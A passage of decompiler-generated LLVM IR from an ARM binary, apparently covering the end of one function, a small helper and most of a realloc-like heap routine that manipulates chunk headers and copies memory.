  store i32 %v3_17f30, i32* @r4, align 4
  store i32 %v6_17f30, i32* @r5, align 4
  store i32 %v9_17f30, i32* @r6, align 4
  store i32 %v12_17f30, i32* @lr, align 4
  ret i32 %v0_1803c

; uselistorder directives
  uselistorder i32 %v1_17fd4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_17fb8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 13, { 0, 3, 4, 6, 1, 5, 2 }
  uselistorder i32 ()* @function_102cc, { 12, 11, 10, 9, 8, 7, 6, 5, 2, 4, 3, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1803c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_18050(i32 %arg1) local_unnamed_addr {
dec_label_pc_18050:
  %v0_18050 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18050, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18050
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18050, %bb
  %v10_18060 = phi i32 [ %arg1, %dec_label_pc_18050 ], [ 0, %bb ]
  ret i32 %v10_18060

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_18064(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18064:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_18064 = load i32, i32* @r4, align 4
  %v6_18064 = load i32, i32* @r5, align 4
  %v9_18064 = load i32, i32* @r6, align 4
  %v12_18064 = load i32, i32* @r7, align 4
  %v15_18064 = load i32, i32* @r8, align 4
  %v18_18064 = load i32, i32* @sb, align 4
  %v21_18064 = load i32, i32* @sl, align 4
  %v24_18064 = load i32, i32* @fp, align 4
  %v27_18064 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_18070 = icmp eq i32* %arg1, null
  store i32 144312, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_18070, label %dec_label_pc_18084, label %dec_label_pc_18094

dec_label_pc_18084:                               ; preds = %dec_label_pc_18064
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_18088 = call i32 @function_12b00(i32 %arg2)
  store i32 %v1_18088, i32* %r0.global-to-local, align 4
  store i32 %v1_18088, i32* @r4, align 4
  br label %dec_label_pc_183ec

dec_label_pc_18094:                               ; preds = %dec_label_pc_18064
  %v2_18094 = icmp eq i32 %arg2, 0
  br i1 %v2_18094, label %dec_label_pc_1809c, label %dec_label_pc_180a8

dec_label_pc_1809c:                               ; preds = %dec_label_pc_18094
  %v0_1809c = call i32 @function_13684()
  store i32 %v0_1809c, i32* %r0.global-to-local, align 4
  %v0_180a0 = load i32, i32* @r6, align 4
  store i32 %v0_180a0, i32* @r4, align 4
  br label %dec_label_pc_183ec

dec_label_pc_180a8:                               ; preds = %dec_label_pc_18094
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_180b0 = load i32, i32* inttoptr (i32 144384 to i32*), align 1024
  store i32 %v4_180b0, i32* @r4, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_180b0, i32* %r2.global-to-local, align 4
  %v4_180bc = load i32, i32* inttoptr (i32 144352 to i32*), align 32
  store i32 %v4_180bc, i32* %r1.global-to-local, align 4
  %v2_180c0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_180c0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_180c8 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_180c8)
  %v0_180d4 = load i32, i32* @r4, align 4
  store i32 %v0_180d4, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_180e0 = load i32, i32* inttoptr (i32 144332 to i32*), align 4
  store i32 %v4_180e0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_180ec.529 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_180e0)
  %v0_180ec = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_180ec, -32
  br i1 %tmp36, label %dec_label_pc_18108, label %dec_label_pc_180f4

dec_label_pc_180f4:                               ; preds = %dec_label_pc_180a8
  %v0_180f4 = call i32 @function_1095c()
  store i32 %v0_180f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_18100 = inttoptr i32 %v0_180f4 to i32*
  store i32 12, i32* %v2_18100, align 4
  br label %dec_label_pc_183ec

dec_label_pc_18108:                               ; preds = %dec_label_pc_180a8
  %v1_18108 = add i32 %v0_180ec, 11
  store i32 %v1_18108, i32* %r0.global-to-local, align 4
  %v0_1810c = load i32, i32* @r5, align 4
  %v1_1810c = add i32 %v0_1810c, -4
  %v2_1810c = inttoptr i32 %v1_1810c to i32*
  %v3_1810c = load i32, i32* %v2_1810c, align 4
  store i32 %v3_1810c, i32* %r2.global-to-local, align 4
  %v2_18110 = icmp ugt i32 %v1_18108, 14
  %v7_18110 = icmp eq i32 %v1_18108, 15
  %v2_18114 = xor i1 %v2_18110, true
  %v3_18114 = or i1 %v7_18110, %v2_18114
  br i1 %v3_18114, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_18108
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_18108, %bb
  %v2_18118 = xor i1 %v7_18110, true
  %v3_18118 = and i1 %v2_18110, %v2_18118
  br i1 %v3_18118, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_18118 = and i32 %v1_18108, -8
  store i32 %v5_18118, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1811c = and i32 %v3_1810c, 2
  %v2_1811c = icmp eq i32 %v1_1811c, 0
  %v1_18120 = add i32 %v0_1810c, -8
  store i32 %v1_18120, i32* @sl, align 4
  %v1_18124 = and i32 %v3_1810c, -4
  store i32 %v1_18124, i32* @r6, align 4
  br i1 %v2_1811c, label %dec_label_pc_1812c, label %dec_label_pc_18304

dec_label_pc_1812c:                               ; preds = %bb29
  %v1_1812c = load i32, i32* @sb, align 4
  %v3_1812c = icmp ult i32 %v1_18124, %v1_1812c
  br i1 %v3_1812c, label %dec_label_pc_18138, label %bb30

bb30:                                             ; preds = %dec_label_pc_1812c
  store i32 %v1_18124, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1829c

dec_label_pc_18138:                               ; preds = %dec_label_pc_1812c
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_18140 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_18140, i32* %r0.global-to-local, align 4
  %v1_18144 = add i32 %v4_18140, 44
  %v2_18144 = inttoptr i32 %v1_18144 to i32*
  %v3_18144 = load i32, i32* %v2_18144, align 4
  store i32 %v3_18144, i32* %r3.global-to-local, align 4
  %v2_18148 = add i32 %v1_18124, %v1_18120
  store i32 %v2_18148, i32* @r4, align 4
  %v9_1814c = icmp eq i32 %v2_18148, %v3_18144
  %v1_18150 = add i32 %v2_18148, 4
  %v2_18150 = inttoptr i32 %v1_18150 to i32*
  %v3_18150 = load i32, i32* %v2_18150, align 4
  store i32 %v3_18150, i32* %r1.global-to-local, align 4
  br i1 %v9_1814c, label %dec_label_pc_18158, label %dec_label_pc_18194

dec_label_pc_18158:                               ; preds = %dec_label_pc_18138
  %v1_18158 = and i32 %v3_18150, -4
  %v2_1815c = add i32 %v1_18158, %v1_18124
  store i32 %v2_1815c, i32* %r1.global-to-local, align 4
  %v1_18160 = add i32 %v1_1812c, 16
  store i32 %v1_18160, i32* %r3.global-to-local, align 4
  %v3_18164 = icmp ult i32 %v2_1815c, %v1_18160
  br i1 %v3_18164, label %dec_label_pc_181e8, label %dec_label_pc_1816c

dec_label_pc_1816c:                               ; preds = %dec_label_pc_18158
  %v2_1816c = sub i32 %v2_1815c, %v1_1812c
  %v1_18170 = urem i32 %v3_1810c, 2
  %v2_18174 = add i32 %v1_1812c, %v1_18120
  store i32 %v2_18174, i32* %r1.global-to-local, align 4
  %v2_18178 = or i32 %v1_1812c, %v1_18170
  store i32 %v2_18178, i32* %r2.global-to-local, align 4
  %v1_1817c = or i32 %v2_1816c, 1
  store i32 %v1_1817c, i32* %r3.global-to-local, align 4
  store i32 %v0_1810c, i32* @r4, align 4
  store i32 %v2_18178, i32* %v2_1810c, align 4
  %v0_18188 = load i32, i32* %r1.global-to-local, align 4
  %v1_18188 = load i32, i32* %r0.global-to-local, align 4
  %v2_18188 = add i32 %v1_18188, 44
  %v3_18188 = inttoptr i32 %v2_18188 to i32*
  store i32 %v0_18188, i32* %v3_18188, align 4
  %v0_1818c = load i32, i32* %r3.global-to-local, align 4
  %v1_1818c = load i32, i32* %r1.global-to-local, align 4
  %v2_1818c = add i32 %v1_1818c, 4
  %v3_1818c = inttoptr i32 %v2_1818c to i32*
  store i32 %v0_1818c, i32* %v3_1818c, align 4
  br label %dec_label_pc_183d0

dec_label_pc_18194:                               ; preds = %dec_label_pc_18138
  %v1_18194 = and i32 %v3_18150, -2
  %v2_18198 = add i32 %v1_18194, %v2_18148
  store i32 %v2_18198, i32* %r3.global-to-local, align 4
  %v1_1819c = add i32 %v2_18198, 4
  %v2_1819c = inttoptr i32 %v1_1819c to i32*
  %v3_1819c = load i32, i32* %v2_1819c, align 4
  store i32 %v3_1819c, i32* %r3.global-to-local, align 4
  %v1_181a0 = urem i32 %v3_1819c, 2
  %v2_181a0 = icmp eq i32 %v1_181a0, 0
  br i1 %v2_181a0, label %dec_label_pc_181a8, label %dec_label_pc_181e8

dec_label_pc_181a8:                               ; preds = %dec_label_pc_18194
  %v1_181a8 = and i32 %v3_18150, -4
  store i32 %v1_181a8, i32* %r3.global-to-local, align 4
  %v2_181ac = add i32 %v1_181a8, %v1_18124
  store i32 %v2_181ac, i32* %r0.global-to-local, align 4
  %v3_181b0 = icmp ult i32 %v2_181ac, %v1_1812c
  br i1 %v3_181b0, label %dec_label_pc_181e8, label %dec_label_pc_181b8

dec_label_pc_181b8:                               ; preds = %dec_label_pc_181a8
  %v1_181b8 = add i32 %v1_18124, %v0_1810c
  %v2_181b8 = inttoptr i32 %v1_181b8 to i32*
  %v3_181b8 = load i32, i32* %v2_181b8, align 4
  store i32 %v3_181b8, i32* %r1.global-to-local, align 4
  %v1_181bc = add i32 %v3_181b8, 12
  %v2_181bc = inttoptr i32 %v1_181bc to i32*
  %v3_181bc = load i32, i32* %v2_181bc, align 4
  store i32 %v3_181bc, i32* %r3.global-to-local, align 4
  %v9_181c0 = icmp eq i32 %v3_181bc, %v2_18148
  %v1_181c4 = add i32 %v2_18148, 12
  %v2_181c4 = inttoptr i32 %v1_181c4 to i32*
  %v3_181c4 = load i32, i32* %v2_181c4, align 4
  store i32 %v3_181c4, i32* %r2.global-to-local, align 4
  br i1 %v9_181c0, label %dec_label_pc_181cc, label %dec_label_pc_181d8

dec_label_pc_181cc:                               ; preds = %dec_label_pc_181b8
  %v1_181cc = add i32 %v3_181c4, 8
  %v2_181cc = inttoptr i32 %v1_181cc to i32*
  %v3_181cc = load i32, i32* %v2_181cc, align 4
  store i32 %v3_181cc, i32* %r3.global-to-local, align 4
  %v9_181d0 = icmp eq i32 %v3_181cc, %v2_18148
  br i1 %v9_181d0, label %dec_label_pc_181dc, label %dec_label_pc_181d8

dec_label_pc_181d8:                               ; preds = %dec_label_pc_181b8, %dec_label_pc_181cc
  %v0_181d8 = call i32 @function_13900()
  store i32 %v0_181d8, i32* %r0.global-to-local, align 4
  %v0_181dc.pre = load i32, i32* @r1, align 4
  %v1_181dc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_181dc

dec_label_pc_181dc:                               ; preds = %dec_label_pc_181cc, %dec_label_pc_181d8
  %v1_181dc = phi i32 [ %v3_181c4, %dec_label_pc_181cc ], [ %v1_181dc.pre, %dec_label_pc_181d8 ]
  %v0_181dc = phi i32 [ %v3_181b8, %dec_label_pc_181cc ], [ %v0_181dc.pre, %dec_label_pc_181d8 ]
  %v2_181dc = add i32 %v1_181dc, 8
  %v3_181dc = inttoptr i32 %v2_181dc to i32*
  store i32 %v0_181dc, i32* %v3_181dc, align 4
  %v0_181e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_181e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_181e0 = add i32 %v1_181e0, 12
  %v3_181e0 = inttoptr i32 %v2_181e0 to i32*
  store i32 %v0_181e0, i32* %v3_181e0, align 4
  %v1_1829c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1829c

dec_label_pc_181e8:                               ; preds = %dec_label_pc_18158, %dec_label_pc_181a8, %dec_label_pc_18194
  %v1_181e8 = add i32 %v1_1812c, -7
  store i32 %v1_181e8, i32* %r0.global-to-local, align 4
  %v1_181ec = call i32 @function_12b00(i32 %v1_181e8)
  store i32 %v1_181ec, i32* @r0, align 4
  store i32 %v1_181ec, i32* %r1.global-to-local, align 4
  %v2_181f0 = icmp eq i32 %v1_181ec, 0
  br i1 %v2_181f0, label %bb31, label %dec_label_pc_181fc

bb31:                                             ; preds = %dec_label_pc_181e8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_183d0

dec_label_pc_181fc:                               ; preds = %dec_label_pc_181e8
  %v1_18204.pre = load i32, i32* @r4, align 4
  %v1_181fc = add i32 %v1_181ec, -4
  %v2_181fc = inttoptr i32 %v1_181fc to i32*
  %v3_181fc = load i32, i32* %v2_181fc, align 4
  store i32 %v3_181fc, i32* @r3, align 4
  %v1_18200 = add i32 %v1_181ec, -8
  store i32 %v1_18200, i32* @r7, align 4
  %v9_18204 = icmp eq i32 %v1_18200, %v1_18204.pre
  br i1 %v9_18204, label %.thread2, label %dec_label_pc_18214

.thread2:                                         ; preds = %dec_label_pc_181fc
  %v2_18208 = and i32 %v3_181fc, -4
  store i32 %v2_18208, i32* %r3.global-to-local, align 4
  %v2_1820c = load i32, i32* @r6, align 4
  %v3_1820c = add i32 %v2_1820c, %v2_18208
  store i32 %v3_1820c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1829c

dec_label_pc_18214:                               ; preds = %dec_label_pc_181fc
  %v0_18214 = load i32, i32* @r6, align 4
  %v1_18214 = add i32 %v0_18214, -4
  store i32 %v1_18214, i32* @r2, align 4
  %v3_18218 = udiv i32 %v1_18214, 4
  store i32 %v3_18218, i32* @ip, align 4
  %tmp37 = and i32 %v1_18214, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_18220 = icmp ult i32 %v1_18214, 36
  %v3_18220 = or i1 %tmp38, %v2_18220
  %v0_18230 = load i32, i32* @r5, align 4
  br i1 %v3_18220, label %dec_label_pc_18230, label %dec_label_pc_18224

dec_label_pc_18224:                               ; preds = %dec_label_pc_18214
  store i32 %v0_18230, i32* @r1, align 4
  %v0_18228 = call i32 @function_12050()
  store i32 %v0_18228, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_18230:                               ; preds = %dec_label_pc_18214
  %v1_18230 = inttoptr i32 %v0_18230 to i32*
  %v2_18230 = load i32, i32* %v1_18230, align 4
  store i32 %v2_18230, i32* %r3.global-to-local, align 4
  %v2_18234 = inttoptr i32 %v1_181ec to i32*
  store i32 %v2_18230, i32* %v2_18234, align 4
  %v0_18238 = load i32, i32* @r5, align 4
  %v1_18238 = add i32 %v0_18238, 4
  %v2_18238 = inttoptr i32 %v1_18238 to i32*
  %v3_18238 = load i32, i32* %v2_18238, align 4
  store i32 %v3_18238, i32* %r3.global-to-local, align 4
  %v1_1823c = load i32, i32* %r1.global-to-local, align 4
  %v2_1823c = add i32 %v1_1823c, 4
  %v3_1823c = inttoptr i32 %v2_1823c to i32*
  store i32 %v3_18238, i32* %v3_1823c, align 4
  %v0_18240 = load i32, i32* @r5, align 4
  %v1_18240 = add i32 %v0_18240, 8
  %v2_18240 = inttoptr i32 %v1_18240 to i32*
  %v3_18240 = load i32, i32* %v2_18240, align 4
  store i32 %v3_18240, i32* %r3.global-to-local, align 4
  %v0_18244 = load i32, i32* @ip, align 4
  %v1_18248 = load i32, i32* %r1.global-to-local, align 4
  %v2_18248 = add i32 %v1_18248, 8
  %v3_18248 = inttoptr i32 %v2_18248 to i32*
  store i32 %v3_18240, i32* %v3_18248, align 4
  %tmp39 = icmp ult i32 %v0_18244, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_18250

dec_label_pc_18250:                               ; preds = %dec_label_pc_18230
  %v0_18250 = load i32, i32* @r5, align 4
  %v1_18250 = add i32 %v0_18250, 12
  %v2_18250 = inttoptr i32 %v1_18250 to i32*
  %v3_18250 = load i32, i32* %v2_18250, align 4
  store i32 %v3_18250, i32* %r3.global-to-local, align 4
  %v1_18254 = load i32, i32* %r1.global-to-local, align 4
  %v2_18254 = add i32 %v1_18254, 12
  %v3_18254 = inttoptr i32 %v2_18254 to i32*
  store i32 %v3_18250, i32* %v3_18254, align 4
  %v0_18258 = load i32, i32* @r5, align 4
  %v1_18258 = add i32 %v0_18258, 16
  %v2_18258 = inttoptr i32 %v1_18258 to i32*
  %v3_18258 = load i32, i32* %v2_18258, align 4
  store i32 %v3_18258, i32* %r3.global-to-local, align 4
  %v0_1825c = load i32, i32* @ip, align 4
  %v1_18260 = load i32, i32* %r1.global-to-local, align 4
  %v2_18260 = add i32 %v1_18260, 16
  %v3_18260 = inttoptr i32 %v2_18260 to i32*
  store i32 %v3_18258, i32* %v3_18260, align 4
  %tmp40 = icmp ult i32 %v0_1825c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_18268

dec_label_pc_18268:                               ; preds = %dec_label_pc_18250
  %v0_18268 = load i32, i32* @r5, align 4
  %v1_18268 = add i32 %v0_18268, 20
  %v2_18268 = inttoptr i32 %v1_18268 to i32*
  %v3_18268 = load i32, i32* %v2_18268, align 4
  store i32 %v3_18268, i32* %r3.global-to-local, align 4
  %v1_1826c = load i32, i32* %r1.global-to-local, align 4
  %v2_1826c = add i32 %v1_1826c, 20
  %v3_1826c = inttoptr i32 %v2_1826c to i32*
  store i32 %v3_18268, i32* %v3_1826c, align 4
  %v0_18270 = load i32, i32* @r5, align 4
  %v1_18270 = add i32 %v0_18270, 24
  %v2_18270 = inttoptr i32 %v1_18270 to i32*
  %v3_18270 = load i32, i32* %v2_18270, align 4
  store i32 %v3_18270, i32* %r3.global-to-local, align 4
  %v1_18274 = load i32, i32* %r1.global-to-local, align 4
  %v2_18274 = add i32 %v1_18274, 24
  %v3_18274 = inttoptr i32 %v2_18274 to i32*
  store i32 %v3_18270, i32* %v3_18274, align 4
  %v0_18278 = load i32, i32* @ip, align 4
  %v7_18278 = icmp eq i32 %v0_18278, 9
  br i1 %v7_18278, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_18268
  %v1_1827c = load i32, i32* @r5, align 4
  %v2_1827c = add i32 %v1_1827c, 28
  %v3_1827c = inttoptr i32 %v2_1827c to i32*
  %v4_1827c = load i32, i32* %v3_1827c, align 4
  store i32 %v4_1827c, i32* %r3.global-to-local, align 4
  %v2_18280 = load i32, i32* %r1.global-to-local, align 4
  %v3_18280 = add i32 %v2_18280, 28
  %v4_18280 = inttoptr i32 %v3_18280 to i32*
  store i32 %v4_1827c, i32* %v4_18280, align 4
  %v1_18284 = load i32, i32* @r5, align 4
  %v2_18284 = add i32 %v1_18284, 32
  %v3_18284 = inttoptr i32 %v2_18284 to i32*
  %v4_18284 = load i32, i32* %v3_18284, align 4
  store i32 %v4_18284, i32* %r3.global-to-local, align 4
  %v2_18288 = load i32, i32* %r1.global-to-local, align 4
  %v3_18288 = add i32 %v2_18288, 32
  %v4_18288 = inttoptr i32 %v3_18288 to i32*
  store i32 %v4_18284, i32* %v4_18288, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_18268, %dec_label_pc_18250, %dec_label_pc_18230, %dec_label_pc_18224, %bb32
  %v0_1828c = load i32, i32* @r5, align 4
  store i32 %v0_1828c, i32* @r0, align 4
  %v0_18290 = call i32 @function_13684()
  store i32 %v0_18290, i32* %r0.global-to-local, align 4
  %v0_18294 = load i32, i32* @r7, align 4
  %v1_18294 = add i32 %v0_18294, 8
  store i32 %v1_18294, i32* @r4, align 4
  br label %dec_label_pc_183d0

dec_label_pc_1829c:                               ; preds = %bb30, %.thread2, %dec_label_pc_181dc
  %v0_182b0 = phi i32 [ %v3_1820c, %.thread2 ], [ %v1_18124, %bb30 ], [ %v1_1829c.pre, %dec_label_pc_181dc ]
  %v0_1829c = load i32, i32* @sb, align 4
  %v2_1829c = sub i32 %v0_182b0, %v0_1829c
  store i32 %v2_1829c, i32* %r1.global-to-local, align 4
  %v0_182a4 = load i32, i32* @sl, align 4
  %v1_182a4 = add i32 %v0_182a4, 4
  %v2_182a4 = inttoptr i32 %v1_182a4 to i32*
  %v3_182a4 = load i32, i32* %v2_182a4, align 4
  %tmp41 = icmp ugt i32 %v2_1829c, 15
  %v1_182cc = urem i32 %v3_182a4, 2
  store i32 %v1_182cc, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_182cc, label %dec_label_pc_182ac

dec_label_pc_182ac:                               ; preds = %dec_label_pc_1829c
  %v2_182b0 = or i32 %v1_182cc, %v0_182b0
  store i32 %v2_182b0, i32* %r3.global-to-local, align 4
  store i32 %v2_182b0, i32* %v2_182a4, align 4
  %v0_182b8 = load i32, i32* @sl, align 4
  %v1_182b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_182b8 = add i32 %v1_182b8, %v0_182b8
  store i32 %v2_182b8, i32* %r2.global-to-local, align 4
  %v1_182bc = add i32 %v2_182b8, 4
  %v2_182bc = inttoptr i32 %v1_182bc to i32*
  %v3_182bc = load i32, i32* %v2_182bc, align 4
  %v1_182c0 = or i32 %v3_182bc, 1
  store i32 %v1_182c0, i32* %r3.global-to-local, align 4
  store i32 %v1_182c0, i32* %v2_182bc, align 4
  br label %dec_label_pc_182fc

dec_label_pc_182cc:                               ; preds = %dec_label_pc_1829c
  %v2_182d0 = add i32 %v0_182a4, %v0_1829c
  store i32 %v2_182d0, i32* %r0.global-to-local, align 4
  %v2_182d4 = or i32 %v1_182cc, %v0_1829c
  store i32 %v2_182d4, i32* %r3.global-to-local, align 4
  %v1_182d8 = or i32 %v2_1829c, 1
  store i32 %v1_182d8, i32* %r2.global-to-local, align 4
  store i32 %v2_182d4, i32* %v2_182a4, align 4
  %v0_182e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_182e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_182e0 = add i32 %v1_182e0, 4
  %v3_182e0 = inttoptr i32 %v2_182e0 to i32*
  store i32 %v0_182e0, i32* %v3_182e0, align 4
  %v0_182e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_182e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_182e4 = add i32 %v1_182e4, %v0_182e4
  store i32 %v2_182e4, i32* %r2.global-to-local, align 4
  %v1_182e8 = add i32 %v2_182e4, 4
  %v2_182e8 = inttoptr i32 %v1_182e8 to i32*
  %v3_182e8 = load i32, i32* %v2_182e8, align 4
  %v1_182ec = or i32 %v3_182e8, 1
  store i32 %v1_182ec, i32* %r3.global-to-local, align 4
  store i32 %v1_182ec, i32* %v2_182e8, align 4
  %v0_182f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_182f4 = add i32 %v0_182f4, 8
  store i32 %v1_182f4, i32* @r0, align 4
  %v0_182f8 = call i32 @function_13684()
  store i32 %v0_182f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_182fc

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182ac, %dec_label_pc_182cc
  %v0_182fc = load i32, i32* @sl, align 4
  %v1_182fc = add i32 %v0_182fc, 8
  store i32 %v1_182fc, i32* @r4, align 4
  br label %dec_label_pc_183d0

dec_label_pc_18304:                               ; preds = %bb29
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_1830c = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_1830c, i32* @r8, align 4
  %v2_18310 = inttoptr i32 %v1_18120 to i32*
  %v3_18310 = load i32, i32* %v2_18310, align 4
  store i32 %v3_18310, i32* @r4, align 4
  %v1_18314 = add i32 %v4_1830c, 860
  %v2_18314 = inttoptr i32 %v1_18314 to i32*
  %v3_18314 = load i32, i32* %v2_18314, align 4
  %v1_18318 = add i32 %v3_18310, 4
  %v1_1831c = add i32 %v3_18314, -1
  store i32 %v1_1831c, i32* %r2.global-to-local, align 4
  %v2_18320 = add i32 %v1_18318, %v1_1831c
  %v1_18324 = load i32, i32* @sb, align 4
  %v2_18324 = add i32 %v2_18320, %v1_18324
  store i32 %v2_18324, i32* %r3.global-to-local, align 4
  %v2_18328 = sub i32 0, %v3_18314
  %v3_18328 = and i32 %v2_18324, %v2_18328
  store i32 %v3_18328, i32* @r7, align 4
  %v2_1832c = sub i32 %v3_18328, %v3_18310
  store i32 %v2_1832c, i32* @fp, align 4
  %v9_18330 = icmp eq i32 %v1_18124, %v2_1832c
  br i1 %v9_18330, label %dec_label_pc_183a4, label %dec_label_pc_18338

dec_label_pc_18338:                               ; preds = %dec_label_pc_18304
  %v2_18338 = sub i32 %v1_18120, %v3_18310
  store i32 %v2_18338, i32* %r0.global-to-local, align 4
  %v2_1833c = add i32 %v3_18310, %v1_18124
  store i32 %v2_1833c, i32* %r1.global-to-local, align 4
  store i32 %v3_18328, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_18348 = call i32 @function_18730(i32 %v2_18338, i32 %v2_1833c, i32 %v3_18328, i32 1)
  store i32 %v4_18348, i32* %r0.global-to-local, align 4
  %v7_1834c = icmp eq i32 %v4_18348, -1
  br i1 %v7_1834c, label %dec_label_pc_18398, label %dec_label_pc_18354

dec_label_pc_18354:                               ; preds = %dec_label_pc_18338
  %v1_18354 = load i32, i32* @r4, align 4
  %v2_18354 = add i32 %v1_18354, %v4_18348
  store i32 %v2_18354, i32* %r0.global-to-local, align 4
  %v0_18358 = load i32, i32* @fp, align 4
  %v1_18358 = or i32 %v0_18358, 2
  store i32 %v1_18358, i32* %r3.global-to-local, align 4
  %v2_1835c = add i32 %v2_18354, 4
  %v3_1835c = inttoptr i32 %v2_1835c to i32*
  store i32 %v1_18358, i32* %v3_1835c, align 4
  %v0_18360 = load i32, i32* @r8, align 4
  %v1_18360 = add i32 %v0_18360, 868
  %v2_18360 = inttoptr i32 %v1_18360 to i32*
  %v3_18360 = load i32, i32* %v2_18360, align 4
  store i32 %v3_18360, i32* %r3.global-to-local, align 4
  %v1_18364 = add i32 %v0_18360, 880
  %v2_18364 = inttoptr i32 %v1_18364 to i32*
  %v3_18364 = load i32, i32* %v2_18364, align 4
  store i32 %v3_18364, i32* %r2.global-to-local, align 4
  %v0_18368 = load i32, i32* @r6, align 4
  %v2_18368 = sub i32 %v3_18360, %v0_18368
  store i32 %v2_18368, i32* %r3.global-to-local, align 4
  %v1_1836c = load i32, i32* @r7, align 4
  %v2_1836c = add i32 %v1_1836c, %v2_18368
  store i32 %v2_1836c, i32* %r1.global-to-local, align 4
  %v1_18370 = add i32 %v0_18360, 872
  %v2_18370 = inttoptr i32 %v1_18370 to i32*
  %v3_18370 = load i32, i32* %v2_18370, align 4
  store i32 %v3_18370, i32* %r3.global-to-local, align 4
  %v1_18378 = add i32 %v0_18360, 884
  %v2_18378 = inttoptr i32 %v1_18378 to i32*
  %v3_18378 = load i32, i32* %v2_18378, align 4
  store i32 %v3_18378, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1836c, %v3_18364
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_18354
  store i32 %v2_1836c, i32* %v2_18364, align 4
  %v0_18380.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_18380.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_18354, %bb33
  %v1_18380 = phi i32 [ %v0_18360, %dec_label_pc_18354 ], [ %v1_18380.pre, %bb33 ]
  %v0_18380 = phi i32 [ %v2_1836c, %dec_label_pc_18354 ], [ %v0_18380.pre, %bb33 ]
  %v2_18380 = add i32 %v1_18380, 868
  %v3_18380 = inttoptr i32 %v2_18380 to i32*
  store i32 %v0_18380, i32* %v3_18380, align 4
  %v0_18384 = load i32, i32* %r1.global-to-local, align 4
  %v1_18384 = load i32, i32* %r3.global-to-local, align 4
  %v2_18384 = add i32 %v1_18384, %v0_18384
  store i32 %v2_18384, i32* %r1.global-to-local, align 4
  %v1_18388 = load i32, i32* %r2.global-to-local, align 4
  %v0_1838c = load i32, i32* %r0.global-to-local, align 4
  %v1_1838c = add i32 %v0_1838c, 8
  store i32 %v1_1838c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_18384, %v1_18388
  br i1 %tmp43, label %bb35, label %dec_label_pc_183d0

bb35:                                             ; preds = %bb34
  %v5_18390 = load i32, i32* @r8, align 4
  %v6_18390 = add i32 %v5_18390, 884
  %v7_18390 = inttoptr i32 %v6_18390 to i32*
